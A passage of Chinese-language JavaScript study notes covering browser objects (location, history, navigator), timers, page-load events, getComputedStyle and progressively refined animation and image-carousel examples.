	location.replace("http://www.jd.com")   --- 没有后退
```
>[danger] ##### 操作浏览器前进后退 --- history
```
window.history.forward();    ---- 前进
window.history.back();       ---- 后退
```
>[danger] ##### 判断浏览器类型 --- navigator.userAgent
```
console.log(window.navigator.userAgent);    ---  判断浏览器类型
console.log(window.navigator.platform);     --- platform判断浏览器系统平台类型

```
>[danger] #####  定时器  ---  setInterval
```
1.var timeId = setInterval(function () {
    alert("hello");//断言
  }, 1000);                    --- 创建定时器
  
2.clearInterval(timeId);       --- 清除定时器


————————————————————————————————————————————————


3. var timeId = window.setTimeout(function () {
            alert("你好");
        }, 1000);         	   --- 创建一次性定时器
        
        
4.  document.getElementById('btn').onclick=function () {
            clearTimeout(timeId)
        }                       --- 清除定时器
```
>[success] # 关于页面的一些事件
```
1.有时候我们调用的东西在页面加载之前，往往会产生报错，这时候可以用onload
```
>[danger] ##### 页面加载完触发 -- onload
```
1.window 可以直接省略
```
```
    <script>
        window.onload =function () {
            var inputObj = document.getElementById("btn")
            inputObj.onclick = function (ev) {
                console.log("1")
            }
        }
    </script>
</head>
<body>
<div id="box">
    <input type="button" value="点击" id="btn">
</div>
```

>[danger] ##### 页面关闭后触发 --- onunload
```
onunload = function(){

}
```
>[danger] ##### 页面关闭之前触发 --- onbeforeunload
```
onbeforeunload = function(){

}
```
[location--当前 URL 信息](location--含有关当前URL的信息.md)
[history -- 控制前进后退](history--控制前进后退.md)
[navigator --- 判断浏览器类型](userAgent---判断浏览器类型.md)
[setInterval -- 定时器](setInterval--定时器.md)
[setTimeout -- 一次性定时器](setTimeout--一次性定时器.md)
[getComputedStyle -- 最强的获取位置](getComputedStyle--最强的获取位置.md)

[Toc]
>[success] # location 对象
```
1.Location 对象包含有关当前 URL 的信息。
2.Location 对象是 Window 对象的一个部分，可通过 window.location 属性来访问。
```
>[danger] ##### 拆分url 方法
```
//地址栏上#及后面的内容
console.log(window.location.hash);
//主机名及端口号
console.log(window.location.host);
//主机名
console.log(window.location.hostname);
//文件的路径---相对路径
console.log(window.location.pathname);
//端口号
console.log(window.location.port);
//协议
console.log(window.location.protocol);
//搜索的内容 ？后面包含？
console.log(window.location.search);
```
>[danger] ##### 常用的跳转刷新
```
1.location.href="http://www.jd.com"       --- 连接跳转
2.location.assign("http://www.jd.com");   --- 连接跳转的方法
3.location.reload();                      --- 重新加载--刷新
4.location.replace("http://www.jd.com")   --- 没有后退
```
>[success] # history 控制浏览器前进后退
```
window.history.forward();    ---- 前进
window.history.back();       ---- 后退
```
>[success] # 判断浏览器类型
```
console.log(window.navigator.userAgent);    ---  判断浏览器类型
console.log(window.navigator.platform);     --- platform判断浏览器系统平台类型
```
[TOC]
>[success] # 定时器 -- setInterval
```
定时器：
 1.参数1:函数
 2.参数2:时间---毫秒---1000毫秒--1秒
 3.执行过程:页面加载完毕后,过了1秒,执行一次函数的代码,又过了1秒再执行函数.....
 返回值就是定时器的id值
```

>[danger] ##### 创建定时器

```
<script>
    var dt = new Date();
    console.log(dt,222);

    var timeId = setInterval(function () {
        var dt = new Date();
        console.log(dt);

   },1000)
</script>
```
>[danger] ##### 停止定时器
```
1.参数:要清理的定时的id的值
```
```
document.getElementById("btn").onclick = function () {
    //点击按钮,停止定时器
    //参数:要清理的定时的id的值
    window.clearInterval(timeId);
  };
```
>[danger] ##### 协议的禁止变同意按钮
```
1.触发定时器，value 根据时间变化
2.当时间等于0的时候清空定时器，清除display 属性，清空属性后将文本从新赋值
```
```
<textarea name="texta" id="" cols="30" rows="10">
测试测试测试测试
</textarea>
<input type="button" value="请仔细阅读协议(5)" id="btn" disabled="disabled" />
<script>
        function my$(id) {
            return document.getElementById(id);
        }
        var time = 5;
        var timeid = setInterval(function () {
            time--;
            my$('btn').value="请仔细阅读协议("+time+")";
            if(time == 0){
                clearInterval(timeid);
                my$("btn").disabled=false;
                my$("btn").value="同意";
            }
        },1000)
</script>
```
>[danger] ##### div 渐变颜色
```
1.默认的opacity 是小于1的小数，所以先扩大十倍在缩小十倍
```
```
    <style>
        div{
            width: 300px;
            height: 200px;
            background-color: hotpink;

        }
    </style>
</head>
<body>
<div id="dv"></div>
<input type="button" value="渐变" id="btn"/>

<script>
        function my$(id) {
            return document.getElementById(id);
        }
        my$('btn').onclick = function () {
            var opactity = 10;
            var timeid = setInterval(function () {
                opactity--
                if(opactity == 0){
                    clearInterval(timeid);//清理定时器
                }
                my$('dv').style.opacity = opactity/10;
            }, 200)
        }
</script>
```
>[danger] ##### 改变div 宽度
```
1.虽然样式已经定义了 宽度，但是调用的时候还是要重新定义宽度
```
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        div {
            width: 200px;
            height: 150px;
            background-color: red;
            border-radius: 100px;
        }
    </style>
</head>
<body>
<input type="button" value="变宽" id="btn"/>
<div id="dv"></div>

<script>
        function my$(id) {
            return document.getElementById(id);
        }
        my$('btn').onclick = function () {
            var width = 200
            var timeid = setInterval(function () {
                width +=20
                my$('dv').style.width = width+'px'
                if(width==800){
                    clearInterval(timeid)
                }
            }, 1000)
        }
</script>
```
>[danger] ##### 案例图片动起来
```
1.将两个图片放到一个div中 控制这个人div 上下浮动
2.设置div的absolute 绝对位置，让其脱离文本流
3.设置左右控制他的位置
```
```
    <style>
        img {
            width: 200px;
            height: 200px;
        }

        div {
            position: absolute;
        }
    </style>
</head>
<body>
<input type="button" value="触发定时器" id="btn1">
<input type="button" value="结束定时器" id="btn2">
<div id="dv">
    <img src="images/heihei.jpg" alt="">
    <img src="images/lyml.jpg" alt="">
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var timeId = "";
    my$('btn1').onclick = function () {
        timeId = setInterval(function () {
            var x = parseInt(Math.random() * 100 + 1);
            var y = parseInt(Math.random() * 100 + 1);
            my$('dv').style.left = x + "px"
            my$("dv").style.top = y + "px";
        }, 1000)
    }

    my$("btn2").onclick=function () {
        clearInterval(timeId);
    };
</script>
```

>[danger] ##### 小星星
```
1.利用firstElementChild 控制第一个子集元素
```

```
    div{
      width: 600px;
      height: 600px;
      border:2px solid yellow;
      background-color: black;
      position: relative;
    }
    span{
      font-size: 30px;
      color: yellow;
      position: absolute;
    }
  </style>
</head>
<body>
<input type="button" value="亮起来" id="btn"/>
<div id="dv"></div>
<script src="common.js"></script>
<script>
  my$("btn").onclick=function () {
    setInterval(function () {
      my$("dv").innerHTML="<span>★</span>";
      var x = parseInt(Math.random() * 600 + 1);
      var y = parseInt(Math.random() * 600 + 1);
      my$("dv").firstElementChild.style.left=x+"px";
      my$("dv").firstElementChild.style.top=y+"px";
    },5);

  };
</script>
```

>[danger] ##### 根据时间切换图片
```
1.根据时间格式拼接图片名称
2.使用命名函数，在页面加载的时候就展示一次，在使用定时
```
```
  function f1() {
    //获取当前时间
    var dt = new Date();
    //获取小时
    var hour = dt.getHours();
    //获取秒
    var second = dt.getSeconds();

    hour = hour < 10 ? "0" + hour : hour;
    second = second < 10 ? "0" + second : second;

    my$("im").src="meimei/"+hour+"_"+second+".jpg";
  }
  f1();
  //页面加载完毕后,过了1秒才执行函数的代码
  setInterval(f1,1000);
```
>[success] # 一次性定时器 --- setTimeout
```
1.只执行一次的定时器
2.虽然执行一次，但需要定时清除
```
>[danger] ##### 案例
```
<input type="button" value="停下" id="btn">
<script>
        var timeId = window.setTimeout(function () {
            alert("你好");
        }, 1000);
        document.getElementById('btn').onclick=function () {
            clearTimeout(timeId)
        }
</script>
```
>[success] # getComputedStyle -- 获取css 样式/位置
```
1.getComputedStyle 获取比offset 厉害的地方在于，offset 只能获取脱离文档流后的位置
2.ie中不支持ie8 支持 my$("dv").currentStyle.left
```
>[danger] ##### 案例例子
```
1.两个参数第一个是ele 对象，第二个目前不知，但设置成null。
2.window.getComputedStyle(my$('dv') 返回的是这个对象的所用 属性，通过字典方式调用， 或者通过点的方式
```
![](https://box.kancloud.cn/f856074bb5c6fe33bd107fabc5b2aeb6_1902x135.png)
```
    <style>
        *{
            margin: 0;
            padding: 0;
        }
        div{
            width: 200px;
            height: 100px;
            background-color: purple;
            left:100px;
            top:0;
        }
    </style>
</head>
<body>
<input type="button" value="显示效果" id="btn"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    console.log(window.getComputedStyle(my$('dv'), null).left)
    console.log(window.getComputedStyle(my$('dv'), null))
    //IE8支持
    //console.log(my$("dv").currentStyle.left);

</script>
```
>[danger] ##### 兼容性代码
```
1.获取返回标签的所有属性的对象，然后调用想用的对象
2.因为返回的是一个对象，所以设计代码的时候，ele 被调用的参数集合，attr 是要获取被调用的对象中的方法
```
```
    <style>
        *{
            margin: 0;
            padding: 0;
        }
        div{
            width: 200px;
            height: 100px;
            background-color: purple;
            left:100px;
            top:0;
        }
    </style>
</head>
<body>
<input type="button" value="显示效果" id="btn"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }


    // 获取位置兼容代码
    function getStyle(ele,attr){
        return window.getComputedStyle? window.getComputedStyle(ele,null)[attr]:ele.currentStyle[attr];
    }

    // 获取任意属性的上下左右
    my$('btn').onclick = function () {
        console.log(getStyle(my$('dv'),'top'))
    }
</script>
```
>[danger] ##### 加速效果函数封装
```
    function animate(element, target) {
        clearInterval(element.timeId);
        //定时器的id值存储到对象的一个属性中
        element.timeId = setInterval(function () {
            //获取元素的当前的位置,数字类型
            var current = element.offsetLeft;
            //每次移动的距离
            var step = 10;
            step = current < target ? step : -step;
            //当前移动到位置
            current += step;
            if (Math.abs(current - target) > Math.abs(step)) {
                element.style.left = current + "px";
            } else {
                //清理定时器
                clearInterval(element.timeId);
                //直接到达目标
                element.style.left = target + "px";
            }
        }, 10);
    }
```

>[danger] ##### 动画预览效果
![](https://box.kancloud.cn/418e11f46ddfa6a63a5e47eeeb1d7c5e_878x537.png)

>[success] # 为轮播图做准备
```
1.div要移动,要脱离文档流---position:absolute
2.如果样式的代码是在style的标签中设置,外面是获取不到 直接用例如 ：style.left 使用offsetLeft
3.但是如果赋值移动还是要使用style.left 
4.console.log(my$("dv").offsetLeft); 获取当前div位置
5.使用定时器
```
>[danger] ##### 点击按钮后，方块进行位置移动
```
    <style>

        * {
            margin: 0;
            padding: 0;
        }

        input {
            margin-top: 20px;
        }

        div {
            margin-top: 30px;
            width: 200px;
            height: 100px;
            background-color: green;
            position: absolute;
        }
    </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<input type="button" value="移动到800px" id="btn2"/>
<div id="dv"></div>

<script>
        function my$(id) {
            return document.getElementById(id);
        }
        my$('btn1').onclick = function () {
            var timeid = setInterval(function () {
                var current = my$('dv').offsetLeft
                var step = 9;
                current += step;
                if(current<=400){
                    my$("dv").style.left = current+"px";
                }else {
                    clearInterval(timeid);

                }
            },100)
        }
        my$('btn2').onclick = function () {
            var timeid = setInterval(function () {
                var current = my$('dv').offsetLeft
                var step = 9;
                current += step;
                if(current<=800){
                    my$("dv").style.left = current+"px";
                }else {
                    clearInterval(timeid);

                }
            },100)
        }
</script>
```

>[danger] ##### 升级案例
```
1.上面的案例问题在，如果移动的位数，不能正好被位移数整除，就会导致偏差
2.只能向前移动不能向后移动
3.可以提取共同参数封装成函数
思路：
1.已知元素有，目标值、和触发元素
2.我们在函数中设置好移动 div每次移动多少像素 step
3.判断左右移动利用（目标值-当前值)的绝对值，和每次位移间距 绝对值作比较
4.每次最开始要清除定时器，如果不清除一直点击，就会一直注册，正确步骤清除--触发--清除
5.清除后直接到达目标
```
```
    <style>

        * {
            margin: 0;
            padding: 0;
        }

        input {
            margin-top: 20px;
        }

        div {
            margin-top: 30px;
            width: 200px;
            height: 100px;
            background-color: green;
            position: absolute;
        }
    </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<input type="button" value="移动到800px" id="btn2"/>
<div id="dv"></div>

<script>
        function my$(id) {
            return document.getElementById(id);
        }

        my$("btn1").onclick = function () {
            animate(my$("dv"), 400);
        };
        //点击第二个按钮移动到800px

        my$("btn2").onclick = function () {
            animate(my$("dv"), 800);
        };

        function animate(ele, target) {
            clearInterval(ele.timeId);

            ele.timeId = setInterval(function () {
                var current = ele.offsetLeft;
                var step = 10;
                step = current<target?step:-step;
                current += step;
                if(Math.abs(target - current)> Math.abs(step)){
                    ele.style.left = current + 'px';
                }else {
                    // 清理定时器
                    clearInterval(ele.timeId);
                    ele.style.left = target +'px';
                }

            },20);
        }

</script>
```
>[success] # 轮播图小试牛刀
```
1.第一节的时候我们尝试写了一个，动化效果的封装函数，通过点击按钮让他左右移动
2.这章我们将写一个简单的轮播图效果
```
>[danger] ##### 动画效果图片解析
* 首先看到的案例
![](https://box.kancloud.cn/418e11f46ddfa6a63a5e47eeeb1d7c5e_878x537.png)
* 实际效果做了一个溢出隐藏的效果
![](https://box.kancloud.cn/6ad73bdbae6c85f055598cc05fe8afb0_1311x713.png)

>[danger] ##### 代码效果
```
1.设置一个相框，套着ul标签，对这个相框做溢出隐藏操作
2.设置ul 宽度百分比
3.获取 相框的宽度，获取所有的span标签，获取ul标签进行移动处理，给每一个span
 标签加上数字用来做，移动位置定位
4.循环span 长度给每一个span标签绑定事件，然后再清除所有span标签样式，在用
 this 为这个标签添加样式
5.将ul对象和移动目标位置加入到封装的函数中，注意位置用负数，因为是从右往左
```
```
    <style>
        * {
            margin: 0;
            padding: 0
        }

        ul {
            list-style: none
        }

        img {
            vertical-align: top
        }

        .box {
            width: 730px;
            height: 454px;
            margin: 100px auto;
            padding: 5px;
            border: 1px solid #ccc;
        }

        .inner {
            width: 730px;
            height: 454px;
            background-color: pink;
            overflow: hidden;
            position: relative;
        }

        .inner ul {
            width: 1000%;
            position: absolute;
            top: 0;
            left: 0;
        }

        .inner li {
            float: left;
        }

        .square {
            position: absolute;
            right: 10px;
            bottom: 10px;
        }

        .square span {
            display: inline-block;
            width: 16px;
            height: 16px;
            background-color: #fff;
            text-align: center;
            line-height: 16px;
            cursor: pointer;
        }

        .square span.current {
            background-color: orangered;
            color: #fff;
        }

    </style>
</head>
<body>
<div class="box" id="box">
    <div class="inner"><!--相框-->
        <ul>
            <li><a href="#"><img src="imagess/1.jpg" alt=""/></a></li>
            <li><a href="#"><img src="imagess/2.jpg" alt=""/></a></li>
            <li><a href="#"><img src="imagess/3.jpg" alt=""/></a></li>
            <li><a href="#"><img src="imagess/4.jpg" alt=""/></a></li>
            <li><a href="#"><img src="imagess/5.jpg" alt=""/></a></li>
            <li><a href="#"><img src="imagess/6.jpg" alt=""/></a></li>
        </ul>
        <div class="square">
            <span class="current">1</span>
            <span>2</span>
            <span>3</span>
            <span>4</span>
            <span>5</span>
            <span>6</span>
        </div>
    </div>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var box = my$('box')
    var inner = box.children[0];
    var imgWidth = inner.offsetWidth
    var ulObj=inner.children[0];
    var spanObjs=inner.children[1].children;
    for(var i=0;i<spanObjs.length;i++){
        // 给每一个span 标签做定位
        spanObjs[i].setAttribute('index',i)
        spanObjs[i].onmouseover = function () {
            // 清除所有span 样式
            for(var j=0;j<spanObjs.length;j++){
                spanObjs[j].removeAttribute('class')
            }
            this.className = 'current'
            var index=this.getAttribute("index");
            animate(ulObj,-index*imgWidth);
        }
    }

    function animate(element, target) {
        clearInterval(element.timeId);
        //定时器的id值存储到对象的一个属性中
        element.timeId = setInterval(function () {
            //获取元素的当前的位置,数字类型
            var current = element.offsetLeft;
            //每次移动的距离
            var step = 10;
            step = current < target ? step : -step;
            //当前移动到位置
            current += step;
            if (Math.abs(current - target) > Math.abs(step)) {
                element.style.left = current + "px";
            } else {
                //清理定时器
                clearInterval(element.timeId);
                //直接到达目标
                element.style.left = target + "px";
            }
        }, 20);
    }

</script>
```
>[success] # 小试牛刀
```
1.注意要给ul 设置浮动，要设置ul位置，一定要设置ul长度，长度等于
 照片数量*照片长度
```
>[danger] ##### 案例展示
```
1.效果鼠标悬停展示，出现翻图片按钮
```
![](https://box.kancloud.cn/8f8201254a792d0b8dee17ad30b74b7e_641x382.png)

>[danger] ##### 代码
```
1.注意点 一定要设置ul 标签属性
```
```
    <style>
        body, ul, ol, li, img {
            margin: 0;
            padding: 0;
            list-style: none;
        }
        #box {
            width: 520px;
            height: 280px;
            padding: 5px;
            position: relative;
            border: 1px solid #ccc;
            margin: 100px auto 0;
        }

        .ad {
            width: 520px;
            height: 280px;
            overflow: hidden;
            position: relative;
        }
        .ad li{
            float: left;
        }

        .ad ul {
            position: absolute;
            top: 0;
        }

        #focusD {
            display: none;
        }
        #focusD span {
            width: 40px;
            height: 40px;
            position: absolute;
            left: 5px;
            top: 50%;
            margin-top: -20px;
            background: #000;
            cursor: pointer;
            line-height: 40px;
            text-align: center;
            font-weight: bold;
            font-family: '黑体';
            font-size: 30px;
            color: #fff;
            opacity: 0.3;
            border: 1px solid #fff;
        }

        #focusD #right {
            right: 5px;
            left: auto;
        }
    </style>
</head>
<body>
<div id="box" class="'all">
    <div class="ad">
        <ul id="imgs">
            <li><img src="images/01.jpg"/></li>
            <li><img src="images/02.jpg"/></li>
            <li><img src="images/03.jpg"/></li>
            <li><img src="images/04.jpg"/></li>
            <li><img src="images/05.jpg"/></li>
        </ul>
    </div>
    <div id="focusD">
        <span id="left">&lt;</span><span id="right">&gt;</span>
    </div>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var box = my$('box');
    var ad = box.children[0];
    var imgWidth = ad.offsetWidth;
    var ulObj = ad.children[0];
    var focusD = my$("focusD");

    box.onmouseover = function () {
        focusD.style.display = 'block'
    }

    box.onmouseout = function () {
        focusD.style.display = 'none'
    }
    var index = 0;
    my$("right").onclick = function () {
        if(index<ulObj.children.length-1){
            index++;
            console.log(-index*imgWidth)
            animate(ulObj,-index*imgWidth);
        }

    };
    //点击左边按钮
    my$("left").onclick = function () {
        if(index>0){
            index--;
            animate(ulObj,-index*imgWidth);
        }
    };
    function animate(element, target) {
        clearInterval(element.timeId);
        //定时器的id值存储到对象的一个属性中
        element.timeId = setInterval(function () {
            var current = element.offsetLeft;
            //获取元素的当前的位置,数字类型
            console.log(current)
            //每次移动的距离
            var step = 10;
            step = current < target ? step : -step;
            //当前移动到位置
            current += step;
            if (Math.abs(current - target) > Math.abs(step)) {
                element.style.left = current + "px";
            } else {
                //清理定时器
                clearInterval(element.timeId);
                //直接到达目标
                element.style.left = target + "px";
            }
        }, 20);
    }

</script>
```
>[success] #
```
1.做动画循环效果，利用首尾都是一个图片，当末尾首张图片，即将走过一点
立刻回到首张图片位置形成轮播效果
```

>[danger] ##### 代码
![](https://box.kancloud.cn/988e790c5336ddb9b0c624ef75ac7c7c_372x229.png)
```
  <style>
    * {
      margin: 0;
      padding: 0;
    }

    ul {
      list-style: none;

    }

    img {
      vertical-align: top;
    }

    /*取消图片底部3像素距离*/
    .box {
      width: 300px;
      height: 200px;
      margin: 100px auto;
      border: 1px solid red;
      position: relative;
      overflow: hidden;
    }

    .box ul li {
      float: left;
    }

    .box ul {
      width: 1500px;
      position: absolute;
      left: 0;
      top: 0;
    }
  </style>
</head>
<body>
<div class="box" id="screen">
  <ul>
    <li><img src="imagess/02.jpg" alt=""/></li>
    <li><img src="imagess/03.jpg" alt=""/></li>
    <li><img src="imagess/04.jpg" alt=""/></li>
    <li><img src="imagess/02.jpg" alt=""/></li>
  </ul>
</div>
<script src="common.js"></script>
<script>
  var current = 0;//只声明了一次
  function f1() {
    var ulObj = my$("screen").children[0];
    current -= 10;

    if (current < -900) {
      ulObj.style.left = 0 + "px";
      current = 0;
    } else {
      ulObj.style.left = current + "px";
    }


  }

  var timeId=setInterval(f1, 20);


  my$("screen").onmouseover=function () {
    //停止
    clearInterval(timeId);
  };
  my$("screen").onmouseout=function () {
    //继续
    timeId=setInterval(f1, 20);
  };

</script>
```
>[success] # 分析
```
1.第一步获取所有图片的个数，然后生成点击的序列号
2.给每一个序列号加一个index 标识，然后再目标值移动的时候使用
3.点击向右移动，因为实际做了一个最后一个图片和第一个图片对等，所以获取的最后 
 一个图片的时候也是就是等于图片脚本最后一个，也就是长度-1
4.获取最后一个的时候给图片跳转到第一个，直接执行pic++ 就跳到第二张图片
5.左面的按钮，当等于0的时候直接跳到第五个图片
```
>[danger] ##### 代码
```
1.ulObj.children[0].cloneNode(true)    --- 要复制的对象.cloneNode true深度复制
```
```
    <style type="text/css">
        * {
            padding: 0;
            margin: 0;
            list-style: none;
            border: 0;
        }

        .all {
            width: 500px;
            height: 200px;
            padding: 7px;
            border: 1px solid #ccc;
            margin: 100px auto;
            position: relative;
        }

        .screen {
            width: 500px;
            height: 200px;
            overflow: hidden;
            position: relative;
        }

        .screen li {
            width: 500px;
            height: 200px;
            overflow: hidden;
            float: left;
        }

        .screen ul {
            position: absolute;
            left: 0;
            top: 0px;
            width: 3000px;
        }

        .all ol {
            position: absolute;
            right: 10px;
            bottom: 10px;
            line-height: 20px;
            text-align: center;
        }

        .all ol li {
            float: left;
            width: 20px;
            height: 20px;
            background: #fff;
            border: 1px solid #ccc;
            margin-left: 10px;
            cursor: pointer;
        }

        .all ol li.current {
            background: #DB192A;
        }

        #arr {
            display: none;
        }

        #arr span {
            width: 40px;
            height: 40px;
            position: absolute;
            left: 5px;
            top: 50%;
            margin-top: -20px;
            background: #000;
            cursor: pointer;
            line-height: 40px;
            text-align: center;
            font-weight: bold;
            font-family: '黑体';
            font-size: 30px;
            color: #fff;
            opacity: 0.3;
            border: 1px solid #fff;
        }

        #arr #right {
            right: 5px;
            left: auto;
        }
    </style>
</head>
<body>
<div class="all" id='box'>
    <div class="screen"><!--相框-->
        <ul>
            <li><img src="images/1.jpg" width="500" height="200"/></li>
            <li><img src="images/2.jpg" width="500" height="200"/></li>
            <li><img src="images/3.jpg" width="500" height="200"/></li>
            <li><img src="images/4.jpg" width="500" height="200"/></li>
            <li><img src="images/5.jpg" width="500" height="200"/></li>
        </ul>
        <ol>
        </ol>
    </div>
    <div id="arr"><span id="left">&lt;</span><span id="right">&gt;</span></div>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var box = my$('box')
    var screen = box.children[0]
    var imgWidth = screen.offsetWidth
    var ulObj = screen.children[0];
    var list = ulObj.children;
    var olObj = screen.children[1];
    //焦点的div
    var arr = my$("arr");

    var pic = 0;
    for(var i=0;i<list.length;i++){
        var liObj = document.createElement('li');
        liObj.innerHTML = i+1
        olObj.appendChild(liObj)
        // 一定为每一个span 加一个标记
        liObj.setAttribute('index',i);
        // 鼠标放在数字进行轮播效果
        liObj.onmouseover = function () {
            for(var j=0;j<olObj.children.length;j++){
                olObj.children[j].removeAttribute('class')
            }
            this.className="current";
            // 获取图片位置
            pic = this.getAttribute('index');
            animate(ulObj, -pic * imgWidth);
        };
    }
    olObj.children[0].className = "current"
    // 点击 左右按钮轮播。做一个无间隙轮播效果首尾图片一致
    ulObj.appendChild(ulObj.children[0].cloneNode(true));

    //自动播放
    var timeId= setInterval(clickHandle,1000);

    //鼠标进入到box的div显示左右焦点的div
    box.onmouseover = function () {
        arr.style.display = "block";
        //鼠标进入废掉之前的定时器
        clearInterval(timeId);
    };
    //鼠标离开到box的div隐藏左右焦点的div
    box.onmouseout = function () {
        arr.style.display = "none";
        //鼠标离开自动播放
        timeId= setInterval(clickHandle,1000);
    };
    // 点击右面按钮换图片
    my$("right").onclick =clickHandle;
    function clickHandle() {
        // 最后一个照片后 立刻回到对应的第一个照片
        if(pic == list.length-1){
            pic = 0;
            ulObj.style.left = 0 + "px";
        }
        // 紧接着到第二张照片
        pic++;
        animate(ulObj, -pic * imgWidth);
        if(pic == list.length-1){
            olObj.children[olObj.children.length - 1].className = "";
            //第一个按钮颜色设置上
            olObj.children[0].className = "current";
        }else{
            //干掉所有的小按钮的背景颜色
            for (var i = 0; i < olObj.children.length; i++) {
                olObj.children[i].removeAttribute("class");
            }
            olObj.children[pic].className = "current";

        }
    }

    //左边按钮
    my$("left").onclick = function () {
        if (pic == 0) {
            pic = 5;
            ulObj.style.left = -pic * imgWidth + "px";
        }
        pic--;
        animate(ulObj, -pic * imgWidth);
        //设置小按钮的颜色---所有的小按钮干掉颜色
        for (var i = 0; i < olObj.children.length; i++) {
            olObj.children[i].removeAttribute("class");
        }
        //当前的pic索引对应的按钮设置颜色
        olObj.children[pic].className = "current";

    };




    function animate(element, target) {
        clearInterval(element.timeId);
        //定时器的id值存储到对象的一个属性中
        element.timeId = setInterval(function () {
            //获取元素的当前的位置,数字类型
            var current = element.offsetLeft;
            //每次移动的距离
            var step = 10;
            step = current < target ? step : -step;
            //当前移动到位置
            current += step;
            if (Math.abs(current - target) > Math.abs(step)) {
                element.style.left = current + "px";
            } else {
                //清理定时器
                clearInterval(element.timeId);
                //直接到达目标
                element.style.left = target + "px";
            }
        }, 10);
    }
</script>
```
[TOC]
>[success] # 设计一个高度定制函数
```

```
>[danger] ##### 入门分析-- 只能进行左右移动
```
1.和加速不一样的是，判断移动距离的时候，利用的是每次当前值和目标值的差除以响 
 应数值
2.当大于0的时候也就是正向移动时候，2.1类似这种小数要向上取整，反向则相反 
```
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        div {
            margin-top: 20px;
            width: 200px;
            height: 100px;
            background-color: green;
            position: absolute;
            left: 0;
            top: 0;
        }
    </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<input type="button" value="移动到800px" id="btn2"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$("btn1").onclick = function () {
        animate(my$("dv"), 400);
    };

    my$("btn2").onclick = function () {
        animate(my$("dv"), 800);
    };

    function animate(ele, target) {
        clearInterval(ele.timeId);

        ele.timeId = setInterval(function () {
            var current = ele.offsetLeft
            // 匀加速运动，每次速度 是变换的
            var step = (target-current)/10
            var step = step>0?Math.ceil(step):Math.floor(step);
            current += step
            ele.style.left = current + "px";
            if(current==target){
                clearInterval(ele.timeId);
            }
            console.log("目标位置:"+target+",当前位置:"+current+",每次移动步数:"+step);
        },10)
    }
</script>
```
>[danger] ##### 小试牛刀 --- 任意属性进行动化效果展示
```
1.任意属性 比上面的代码，就要多添加一个属性的参数
2.封装了一个获取属性的 方法，在使用这个方法的时候用parseInt 获取整数去掉后缀px
3.把上面代码写好固定死的属性，换成出入的属性调用
```
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        div {
            margin-top: 20px;
            width: 200px;
            height: 100px;
            background-color: green;
            position: absolute;
            left: 0;
            top: 0;
        }
    </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<input type="button" value="移动到800px" id="btn2"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$("btn1").onclick = function () {
        //获取div此时left的当前位置,达到目标400
        //animate(my$("dv"),"left",400);
        //获取div此时的宽度,达到目标200
        animate(my$("dv"),"width",2000);
    };

    //获取任意的一个属性的当前的属性值: left--->此时的left属性的值,width---当前的元素的宽
    function getStyle(element,attr) {
        //判断浏览器是否支持这个方法
        return window.getComputedStyle? window.getComputedStyle(element,null)[attr]:element.currentStyle[attr];
    }

    function animate(ele, attr, target) {
        clearInterval(ele.timeId);

        ele.timeId = setInterval(function () {
            // 返回的带px 转换成数字类型
            var current = parseInt(getStyle(ele,attr))
            var step = (target-current)/10
            step = step>0?Math.ceil(step):Math.floor(step);
            current += step
            ele.style[attr] = current +'px'
            if(target == current){
                clearInterval(ele.timeId);
            }
            //测试代码:
            console.log("目标位置:"+target+",当前位置:"+current+",每次移动步数:"+step);
        }, 10)
    }
</script>
```
>[danger] ##### 渐入佳境 --- 定义多个属性移动
```
1、把目标值和对象看做一组数据，进行传递迭代
2.对每一个传递的json 对象中的k,v的值重新取值，赋值
```
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        div {
            margin-top: 20px;
            width: 200px;
            height: 100px;
            background-color: green;
            position: absolute;
            left: 0;
            top: 0;
        }
    </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<input type="button" value="移动到800px" id="btn2"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    my$("btn1").onclick=function () {

        animate(my$("dv"),{"width":400,"height":500,"left":500,"top":80});
    };

    //获取任意的一个属性的当前的属性值: left--->此时的left属性的值,width---当前的元素的宽
    function getStyle(element,attr) {
        //判断浏览器是否支持这个方法
        return window.getComputedStyle? window.getComputedStyle(element,null)[attr]:element.currentStyle[attr];
    }

    function animate(ele, json) {
        clearInterval(ele.timeId);

        ele.timeId = setInterval(function () {
            var flag=true;//默认,假设,全部到达目标
            for (var attr in json){
                var current = parseInt(getStyle(ele,attr))
                // 获取目标位置
                var target = json[attr];
                var step=(target-current)/10;
                step=step>0?Math.ceil(step):Math.floor(step);
                current+=step;//移动后的值
                ele.style[attr]=current+"px";
                // 看当前 位置 是否等于目标位置
                if(current!=target){
                    flag=false;
                }
            }
            if(flag){
                //清理定时器
                clearInterval(ele.timeId);
            }
            console.log("目标:"+target+",当前:"+current+",每次的移动步数:"+step);

    },10)}
</script>
```
>[danger] ##### 出神入化 --- 增回调函数
```
1.所有的属性到达目标才能使用这个函数,前提是用户传入了这个函数
2.增加回调函数后整个代码可以在执行自己的之后，去执行回调函数执行的代码
```
```
  <style>
    *{
      margin: 0;
      padding: 0;
    }
    div{
      margin-top: 30px;
      width: 200px;
      height: 100px;
      background-color: green;
      position: absolute;
      left:0;
      top:0;
    }
  </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<div id="dv">
</div>
<script src="common.js"></script>
<script>
  //点击按钮,改变宽度到达一个目标值,高度到达一个目标值

  //获取任意一个元素的任意一个属性的当前的值---当前属性的位置值
  function getStyle(element,attr) {
    return window.getComputedStyle? window.getComputedStyle(element,null)[attr]:element.currentStyle[attr]||0;
  }



